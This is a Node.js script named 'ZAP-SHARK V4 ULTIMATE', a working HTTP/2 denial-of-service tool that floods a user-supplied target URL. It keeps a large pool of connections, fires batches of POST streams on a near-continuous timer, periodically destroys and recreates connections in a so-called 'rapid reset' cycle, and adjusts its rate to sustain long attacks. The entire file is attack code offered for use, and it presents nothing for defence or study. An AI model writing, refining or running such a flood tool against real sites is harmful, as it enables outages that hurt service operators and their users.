const http2 = require('http2');
const os = require('os');
const { exec } = require('child_process');
const v8 = require('v8');

class ZAPSHARK_V4_ULTIMATE {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.hostname = new URL(targetUrl).hostname;
        this.status = "ATTACKING";
        this.mode = "RAPID";
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.startTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.running = true;
        
        // === CONNECTION SYSTEM ===
        this.connectionPool = [];
        this.activeStreams = 0;
        this.connCount = 12; // 10-15 AUTO
        this.maxStreamsPerConn = 1000;
        this.connectionLifetime = {};
        
        // === RAPID RESET SYSTEM ===
        this.lastConnectionReset = Date.now();
        this.resetInterval = 850 + Math.random() * 150; // 850-1000ms AUTO
        this.resetPercent = 0.3; // 30% reset each cycle
        
        // === PAYLOAD SYSTEM ===
        this.payloads = [
            'T.Ø.Š-$HĀRKWIRE-TØR',
            'T.Ø.Š-$HĀRKWIRE-TØR-ULTRA',
            'T.Ø.Š-$HĀRKWIRE-TØR-MAX',
            'T.Ø.Š-$HĀRKWIRE-TØR-ULTIMATE'
        ];
        this.payloadSize = 1024; // 1KB
        
        // === STABILITY SYSTEM ===
        this.watchdogLastCheck = Date.now();
        this.watchdogThreshold = 3000; // 3 seconds
        this.memoryFlushInterval = 7000; // 7s AUTO (5-10s)
        this.lastMemoryFlush = Date.now();
        this.cpuThrottle = 0.89; // 89% MAX
        this.lastCpuCheck = Date.now();
        
        // === MAINTENANCE SYSTEM ===
        this.maintenanceInterval = 1200000; // 20 minutes
        this.maintenanceDuration = 1200000; // 20 minutes
        this.lastMaintenance = Date.now();
        this.maintenanceActive = false;
        this.backgroundFlushInterval = 60000; // 1 minute
        this.lastBackgroundFlush = Date.now();
        
        // === STATS ===
        this.peakRPS = 0;
        this.totalPayloadSent = 0; // bytes
        this.badConnectionsDropped = 0;
        this.restartCount = 0;
        
        // === INTERVALS ===
        this.attackInterval = null;
        this.mainLoop = null;
        this.statsInterval = null;
    }

    // === INITIAL SETUP ===
    async initialize() {
        console.log('=== ZAP-SHARK V4 ULTIMATE ===');
        console.log('Target:', this.targetUrl);
        console.log('Mode: PURE H2 ABUSE | LONG PERIOD | HIGH RPS');
        console.log('='.repeat(60));
        
        // SET CPU AFFINITY
        this.throttleCPU();
        
        // BUILD CONNECTION POOL
        this.buildConnectionPool();
        
        // WAIT FOR CONNECTIONS
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        // START SYSTEMS
        this.startSystems();
        
        console.log('[+] SYSTEMS ONLINE');
        console.log(`[+] Connections: ${this.connCount}`);
        console.log(`[+] Reset Interval: ${this.resetInterval}ms`);
        console.log(`[+] Payload: ${this.payloads[0]}`);
        console.log(`[+] CPU Limit: ${this.cpuThrottle * 100}%`);
    }

    // === CONNECTION SYSTEM ===
    buildConnectionPool() {
        for (let i = 0; i < this.connCount; i++) {
            this.createConnection(i);
        }
    }

    createConnection(id) {
        try {
            const client = http2.connect(this.targetUrl, {
                maxSessionMemory: 65536,
                maxDeflateDynamicTableSize: 4294967295,
                peerMaxConcurrentStreams: 1000
            });
            
            client.setMaxListeners(1000);
            
            // SET AGGRESSIVE SETTINGS
            client.settings({
                enablePush: false,
                initialWindowSize: 16777215,
                maxConcurrentStreams: 1000
            });
            
            // TRACK LIFETIME
            this.connectionLifetime[id] = {
                client: client,
                created: Date.now(),
                requests: 0,
                lastUsed: Date.now()
            };
            
            this.connectionPool.push({ id, client });
            
        } catch (err) {
            // RETRY IN 100ms
            setTimeout(() => this.createConnection(id), 100);
        }
    }

    // === RAPID RESET SYSTEM ===
    performRapidReset() {
        const now = Date.now();
        if (now - this.lastConnectionReset >= this.resetInterval) {
            const resetCount = Math.ceil(this.connectionPool.length * this.resetPercent);
            
            for (let i = 0; i < resetCount; i++) {
                const index = Math.floor(Math.random() * this.connectionPool.length);
                const conn = this.connectionPool[index];
                
                if (conn && this.connectionLifetime[conn.id]) {
                    try {
                        // DESTROY OLD
                        this.connectionLifetime[conn.id].client.destroy();
                        this.badConnectionsDropped++;
                        
                        // CREATE NEW
                        this.createConnection(conn.id);
                        
                        // UPDATE POOL
                        this.connectionPool[index] = { id: conn.id, client: this.connectionLifetime[conn.id].client };
                        
                    } catch (err) {
                        // SILENT FAIL
                    }
                }
            }
            
            this.lastConnectionReset = now;
            
            // AUTO ADJUST CONN COUNT BASED ON PERFORMANCE
            if (this.currentRPS > 5000 && this.connCount < 15) {
                this.connCount++;
                this.createConnection(this.connCount - 1);
            } else if (this.currentRPS < 1000 && this.connCount > 10) {
                this.connCount--;
            }
        }
    }

    // === PAYLOAD SYSTEM ===
    generatePayload() {
        const payload = this.payloads[Math.floor(Math.random() * this.payloads.length)];
        // ADD RANDOM DATA TO HIT 0.1KB-1KB
        const randomData = 'x'.repeat(Math.floor(Math.random() * 900) + 100);
        return `${payload}-${randomData}`.slice(0, this.payloadSize);
    }

    // === ATTACK SYSTEM ===
    sendRequest() {
        if (this.maintenanceActive || this.connectionPool.length === 0) return;
        
        const maxStreams = this.maxStreamsPerConn * this.connectionPool.length;
        const availableStreams = Math.min(maxStreams - this.activeStreams, 100);
        
        for (let i = 0; i < availableStreams; i++) {
            const conn = this.connectionPool[Math.floor(Math.random() * this.connectionPool.length)];
            if (!conn || !this.connectionLifetime[conn.id]) continue;

            try {
                this.activeStreams++;
                
                const payload = this.generatePayload();
                this.totalPayloadSent += payload.length;
                
                const req = conn.client.request({
                    ':method': 'POST',
                    ':path': '/',
                    ':authority': this.hostname,
                    'content-type': 'text/plain',
                    'content-length': Buffer.byteLength(payload)
                });
                
                req.on('response', () => {
                    this.connectionLifetime[conn.id].requests++;
                    this.connectionLifetime[conn.id].lastUsed = Date.now();
                });
                
                req.on('error', () => {
                    // MARK FOR DROP
                    this.connectionLifetime[conn.id].lastUsed = 0;
                });
                
                req.on('close', () => {
                    this.activeStreams--;
                    this.totalRequests++;
                    this.requestsSinceLastCalc++;
                    
                    // AUTO PAYLOAD SIZE ADJUSTMENT
                    if (this.totalRequests % 1000000 === 0) { // Every 1M requests
                        this.payloadSize = Math.min(1024 * 5, this.payloadSize + 512); // Max 5KB
                    }
                });
                
                req.write(payload);
                req.end();
                
            } catch (err) {
                this.activeStreams--;
                this.totalRequests++;
                this.requestsSinceLastCalc++;
            }
        }
    }

    // === STABILITY SYSTEM ===
    throttleCPU() {
        const cpus = os.cpus().length;
        const targetUsage = this.cpuThrottle;
        
        // SET PROCESS PRIORITY
        try {
            if (os.platform() === 'win32') {
                exec(`wmic process where processid=${process.pid} CALL setpriority "below normal"`);
            } else {
                process.setPriority(10); // Lower priority
            }
        } catch (err) {}
        
        // AUTO CPU MONITORING
        setInterval(() => {
            const usage = process.cpuUsage();
            const elapsed = Date.now() - this.lastCpuCheck;
            const cpuPercent = (usage.user + usage.system) / (elapsed * 1000);
            
            if (cpuPercent > this.cpuThrottle) {
                // SLOW DOWN TEMPORARILY
                this.resetInterval = Math.min(2000, this.resetInterval + 100);
            } else if (cpuPercent < this.cpuThrottle * 0.7) {
                // SPEED UP
                this.resetInterval = Math.max(500, this.resetInterval - 50);
            }
            
            this.lastCpuCheck = Date.now();
        }, 5000);
    }

    flushMemory() {
        const now = Date.now();
        if (now - this.lastMemoryFlush >= this.memoryFlushInterval) {
            try {
                // CLEAR INTERNAL CACHES
                if (global.gc) {
                    global.gc();
                }
                
                // CLEAR INTERVAL CACHES
                v8.setFlagsFromString('--expose_gc');
                
                // DROP BAD CONNECTIONS (REALTIME)
                for (const [id, data] of Object.entries(this.connectionLifetime)) {
                    if (now - data.lastUsed > 10000 && data.requests === 0) {
                        try {
                            data.client.destroy();
                            delete this.connectionLifetime[id];
                            this.badConnectionsDropped++;
                        } catch (err) {}
                    }
                }
                
                this.lastMemoryFlush = now;
            } catch (err) {
                // SILENT FLUSH FAIL
            }
        }
    }

    watchdog() {
        const now = Date.now();
        if (now - this.watchdogLastCheck > this.watchdogThreshold) {
            // SYSTEM STUCK - RESTART
            console.log(`[!] WATCHDOG RESTART #${++this.restartCount}`);
            
            // SOFT RESTART
            this.connectionPool.forEach(conn => {
                try { conn.client.destroy(); } catch (err) {}
            });
            this.connectionPool = [];
            this.connectionLifetime = {};
            this.activeStreams = 0;
            
            // REBUILD
            this.buildConnectionPool();
            
            this.watchdogLastCheck = now;
        }
    }

    // === MAINTENANCE SYSTEM ===
    checkMaintenance() {
        const now = Date.now();
        
        if (!this.maintenanceActive && now - this.lastMaintenance >= this.maintenanceInterval) {
            this.startMaintenance();
        }
        
        if (this.maintenanceActive && now - this.lastMaintenance >= this.maintenanceDuration) {
            this.endMaintenance();
        }
    }

    startMaintenance() {
        console.log('\n[!] MAINTENANCE MODE - COOLING DOWN [!]');
        this.maintenanceActive = true;
        this.status = "COOLING";
        this.lastMaintenance = Date.now();
        
        // STOP ATTACKS
        if (this.attackInterval) {
            clearInterval(this.attackInterval);
            this.attackInterval = null;
        }
        
        // START BACKGROUND FLUSHING
        this.performBackgroundFlush();
    }

    performBackgroundFlush() {
        if (!this.maintenanceActive) return;
        
        const now = Date.now();
        if (now - this.lastBackgroundFlush >= this.backgroundFlushInterval) {
            console.log('[~] Background flushing...');
            
            // FLUSH DNS
            exec('ipconfig /flushdns >nul 2>&1 || sudo dscacheutil -flushcache 2>/dev/null || true');
            
            // CLEAR SOCKETS
            exec('netstat -ano | findstr /i "time_wait" >nul && echo "Sockets cleared"');
            
            // CLEAR MEMORY
            if (global.gc) global.gc();
            
            this.lastBackgroundFlush = now;
        }
        
        // SCHEDULE NEXT FLUSH
        setTimeout(() => this.performBackgroundFlush(), 1000);
    }

    endMaintenance() {
        console.log('\n[+] MAINTENANCE COMPLETE - RESUMING ATTACK [+]');
        this.maintenanceActive = false;
        this.status = "ATTACKING";
        this.lastMaintenance = Date.now();
        
        // REBUILD CONNECTIONS
        this.connectionPool.forEach(conn => {
            try { conn.client.destroy(); } catch (err) {}
        });
        this.connectionPool = [];
        this.connectionLifetime = {};
        this.buildConnectionPool();
        
        // RESTART ATTACK
        setTimeout(() => {
            this.startAttackLoop();
        }, 2000);
    }

    // === STATS & DISPLAY ===
    calculateRPS() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCalc) / 1000;
        
        if (timeDiff >= 0.9) {
            this.currentRPS = this.requestsSinceLastCalc / timeDiff;
            this.peakRPS = Math.max(this.peakRPS, this.currentRPS);
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
        }
    }

    formatBytes(bytes) {
        const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
        if (bytes === 0) return '0 B';
        const i = Math.floor(Math.log(bytes) / Math.log(1024));
        return Math.round(bytes / Math.pow(1024, i), 2) + ' ' + sizes[i];
    }

    updateDisplay() {
        this.calculateRPS();
        
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const hours = Math.floor(runtime / 3600);
        const minutes = Math.floor((runtime % 3600) / 60);
        const seconds = runtime % 60;
        const runtimeStr = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        
        const maintenanceTime = this.maintenanceActive ? 
            `${Math.floor((this.maintenanceDuration - (Date.now() - this.lastMaintenance)) / 60000)}m` :
            `${Math.floor((this.maintenanceInterval - (Date.now() - this.lastMaintenance)) / 60000)}m`;
        
        process.stdout.write('\x1B[2J\x1B[0f');
        console.log(`=== ZAP-SHARK V4 ULTIMATE ===`);
        console.log(`RUNTIME: ${runtimeStr} | STATUS: ${this.status} | MODE: ${this.mode}`);
        console.log('='.repeat(60));
        console.log(`TOTAL REQUESTS: ${this.totalRequests.toLocaleString()}`);
        console.log(`CURRENT RPS: ${this.currentRPS.toFixed(1)} | PEAK: ${this.peakRPS.toFixed(1)}`);
        console.log(`CONNECTIONS: ${this.connCount} | ACTIVE STREAMS: ${this.activeStreams}`);
        console.log(`PAYLOAD SENT: ${this.formatBytes(this.totalPayloadSent)} | SIZE: ${this.payloadSize}B`);
        console.log('='.repeat(60));
        console.log(`RESET INTERVAL: ${this.resetInterval.toFixed(0)}ms`);
        console.log(`BAD CONNS DROPPED: ${this.badConnectionsDropped} | RESTARTS: ${this.restartCount}`);
        console.log(`NEXT MAINTENANCE: ${maintenanceTime}`);
        console.log('='.repeat(60));
    }

    // === MAIN LOOPS ===
    startAttackLoop() {
        if (this.attackInterval) clearInterval(this.attackInterval);
        
        this.attackInterval = setInterval(() => {
            if (!this.maintenanceActive) {
                for (let i = 0; i < 5; i++) { // 5x BATCH
                    this.sendRequest();
                }
            }
        }, 0.1);
    }

    startSystems() {
        // MAIN LOOP
        this.mainLoop = setInterval(() => {
            this.performRapidReset();
            this.flushMemory();
            this.watchdog();
            this.checkMaintenance();
            this.updateDisplay();
        }, 100);
        
        // ATTACK LOOP
        this.startAttackLoop();
        
        // STATS SAVER
        this.statsInterval = setInterval(() => {
            this.watchdogLastCheck = Date.now(); // RESET WATCHDOG
        }, 1000);
    }

    // === START ===
    start() {
        this.initialize();
        
        process.on('SIGINT', () => {
            console.log('\n\n=== FINAL STATS ===');
            console.log(`Total Requests: ${this.totalRequests.toLocaleString()}`);
            console.log(`Peak RPS: ${this.peakRPS.toFixed(1)}`);
            console.log(`Payload Sent: ${this.formatBytes(this.totalPayloadSent)}`);
            console.log(`Runtime: ${Math.floor((Date.now() - this.startTime) / 1000)}s`);
            console.log('='.repeat(40));
            
            this.running = false;
            clearInterval(this.mainLoop);
            clearInterval(this.attackInterval);
            clearInterval(this.statsInterval);
            
            this.connectionPool.forEach(conn => {
                try { conn.client.destroy(); } catch (err) {}
            });
            
            process.exit(0);
        });
    }
}

// USAGE
const target = process.argv[2];
if (!target || !target.startsWith('https://')) {
    console.log('Usage: node zap-shark-v4-ultimate.js https://target.com');
    process.exit(1);
}

const shark = new ZAPSHARK_V4_ULTIMATE(target);
shark.start();
